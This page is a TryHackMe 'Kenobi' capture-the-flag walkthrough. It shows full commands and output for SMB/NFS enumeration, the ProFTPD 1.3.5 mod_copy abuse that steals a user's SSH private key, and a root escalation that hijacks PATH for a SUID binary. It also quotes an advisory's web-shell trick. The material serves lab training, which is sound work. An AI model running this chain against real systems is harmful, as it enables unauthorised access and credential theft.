---
layout: page
title: Kenobi
description: Kenobi from TryHackMe.
img: 
importance: 4
category: TryHackMe
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/kenobi/logo.png" title="THM Kenobi Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/r/room/kenobi">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
"Only a Sith deals in absolutes."  Well, we are going to absolutely smash this box.

To get started, let us give nmap a run and see what it says.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ nmap -sV -sC -A -O --script vuln -oN nmap 10.10.68.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:16 AEDT
Nmap scan report for 10.10.68.141
Host is up (0.26s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5

<snip>

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)

<snip>

80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))

<snip>

111/tcp  open  rpcbind     2-4 (RPC #100000)

<snip>

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)

<snip>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 351.30 seconds

```
{% endraw %}

<br />
Seeing port 445, use smbclient -L IP to list all of the shares on SMB.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ smbclient -L //10.10.68.141                         
Password for [WORKGROUP\sec]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KENOBI

```
{% endraw %}

<br />
Run the nmap scripts to enumerate SMB.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.68.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:32 AEDT
Nmap scan report for 10.10.68.141
Host is up (0.26s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.68.141\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 3
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.141\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.68.141\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 40.09 seconds

```
{% endraw %}

<br />
Use smbclient to connect to the anonymous share.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ smbclient //10.10.68.141/anonymous
Password for [WORKGROUP\sec]:
Try "help" to get a list of possible commands.
smb: \> 

```
{% endraw %}

<br />
Use ls to get a list of files available on the share.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ smbclient //10.10.68.141/anonymous
Password for [WORKGROUP\sec]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 20:49:09 2019
  ..                                  D        0  Wed Sep  4 20:56:07 2019
  log.txt                             N    12237  Wed Sep  4 20:49:09 2019

                9204224 blocks of size 1024. 6876716 blocks available
smb: \>

```
{% endraw %}

<br />
Get the log.txt file.

{% raw %}
```bash
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (11.3 KiloBytes/sec) (average 11.3 KiloBytes/sec)
```
{% endraw %}

<br />
Check out the log.txt file that was just nicked.  Notice that it shows the path to a private key.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ cat log.txt  
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

<snip>
```
{% endraw %}

<br />
Use nmap to enumerate the NFS shares.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.68.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-07 03:37 AEDT
Nmap scan report for 10.10.68.141
Host is up (0.28s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836916.0  6876712.0  22%   16.0T        32000
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_

Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```
{% endraw %}

<br />
Use netcat to connect to the ftp service to snag the version.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ nc 10.10.68.141 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.68.141]
^C
```
{% endraw %}

<br />
Use searchsploit to fing the ftp service and version.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ searchsploit ProFTP 1.3.5                           
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                                                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                                                       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                                                   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                                                 | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
{% endraw %}

<br />
Read the vulnerability to figure out what it does.  Notice how it explains how to copy and paste system files.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ cp $(locate 36742.txt) .
                                                                                                                                                                                                                                            
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ cat 36742.txt           
Description TJ Saunders 2015-04-07 16:35:03 UTC
Vadim Melihow reported a critical issue with proftpd installations that use the
mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
to be used by *unauthenticated clients*:

---------------------------------
Trying 80.150.216.115...
Connected to 80.150.216.115.
Escape character is '^]'.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@www01a
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /tmp/passwd.copy
250 Copy successful
-----------------------------------------

He provides another, scarier example:

------------------------------
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto <?php phpinfo(); ?>
550 cpto: Permission denied
site cpfr /proc/self/fd/3
350 File or directory exists, ready for destination name
site cpto /var/www/test.php

test.php now contains
----------------------
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument
2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): FTP session opened.
2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q
(slon-P5Q.lan[192.168.3.193]): error opening destination file '/<?php
phpinfo(); ?>' for copying: Permission denied
-----------------------

test.php contains contain correct php script "<?php phpinfo(); ?>" which
can be run by the php interpreter

Source: http://bugs.proftpd.org/show_bug.cgi?id=4169 --------------------- ---------------------------------
Shellcodes: No Results
```
{% endraw %}

<br />
Use SITE CPFR and SITE CPTO to copy the id_rsa discovered above into the tmp folder in the /var folder from the nfs scans, also above.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ nc 10.10.213.34 21                                            
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.213.34]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```
{% endraw %}

<br />
Mount and enumerate the NFS shares.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ sudo mount 10.10.213.34:/var kenobiNFS              
[sudo] password for sec: 
                                                                                                                                                                                                                                            
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ ls -la kenobiNFS 
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxrwxr-x  3 sec  sec   4096 Jan  7 16:13 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 13  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 27  2019 mail
drwxr-xr-x  2 root root  4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 30  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Jan  7 16:03 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```
{% endraw %}

<br />
Copy the id_rsa file to a local file, chmod the permissions to 600, and ssh using this file.

{% raw %}
```bash
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ cp kenobiNFS/tmp/id_rsa .  
                                                                                                                                                                                                                                            
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ sudo chmod 600 id_rsa                 
                                                                                                                                                                                                                                            
┌──(sec㉿kali)-[~/Documents/thm/kenobi]
└─$ ssh -i id_rsa kenobi@10.10.213.34 
The authenticity of host '10.10.213.34 (10.10.213.34)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.213.34' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$
```
{% endraw %}

<br />
Get the user flag.  Remember to add the ifconfig.

{% raw %}
```bash
kenobi@kenobi:~$ cat user.txt 
<redacted>
kenobi@kenobi:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:18:9c:aa:ef:d7  
          inet addr:10.10.213.34  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::18:9cff:feaa:efd7/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:399 errors:0 dropped:0 overruns:0 frame:0
          TX packets:564 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:64551 (64.5 KB)  TX bytes:89544 (89.5 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:172 errors:0 dropped:0 overruns:0 frame:0
          TX packets:172 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:12560 (12.5 KB)  TX bytes:12560 (12.5 KB)
```
{% endraw %}

<br />
Find all of the files with the user stickybit set.

{% raw %}
```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```
{% endraw %}

<br />
Notice the /usr/bin/menu command.  Let's give it a strings to see what it says.  Notice commands like the curl do not use the full path.

{% raw %}
```bash
kenobi@kenobi:~$ strings /usr/bin/menu 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```
{% endraw %}

<br />
Create a copy of /bin/sh in temp and call it curl.  Chmod the permissions to 777.  Export the /tmp folder to the path.

{% raw %}
```bash
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```
{% endraw %}

<br />
Run the menu command again.  Use option 1.

{% raw %}
```bash
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
#
```
{% endraw %}

<br />
Get the root flag.

{% raw %}
```bash
# cat /root/root.txt
<redacted>
# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:18:9c:aa:ef:d7  
          inet addr:10.10.213.34  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::18:9cff:feaa:efd7/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1063 errors:0 dropped:0 overruns:0 frame:0
          TX packets:966 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:112891 (112.8 KB)  TX bytes:144670 (144.6 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:180 errors:0 dropped:0 overruns:0 frame:0
          TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:13040 (13.0 KB)  TX bytes:13040 (13.0 KB)
```
{% endraw %}

And with that, that is the end of the box.  Go forth and conquer.